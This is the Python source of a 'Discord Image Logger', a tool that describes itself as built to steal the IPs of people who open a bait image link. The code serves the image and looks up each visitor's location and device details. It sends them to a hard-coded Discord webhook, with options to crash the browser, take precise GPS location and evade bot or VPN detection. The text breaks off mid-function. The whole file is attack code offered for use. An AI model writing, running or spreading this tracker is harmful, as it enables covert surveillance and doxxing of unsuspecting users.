# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1272688187461996607/d2kj_IDDsRUk1E7H-WduilgbDmTA7uT1Qs2f85it-nO2LffQuRzLW6gXPc50TQbgOveI",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Xitter BOT", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

